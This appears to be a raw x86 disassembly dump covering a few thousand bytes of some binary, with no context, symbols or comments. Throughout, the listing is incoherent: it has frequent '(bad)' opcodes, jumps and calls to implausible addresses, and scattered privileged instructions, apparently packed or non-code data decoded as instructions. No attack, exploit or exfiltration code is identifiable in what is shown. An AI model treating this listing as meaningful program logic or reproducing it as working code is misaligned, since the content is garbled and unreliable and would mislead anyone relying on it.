  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
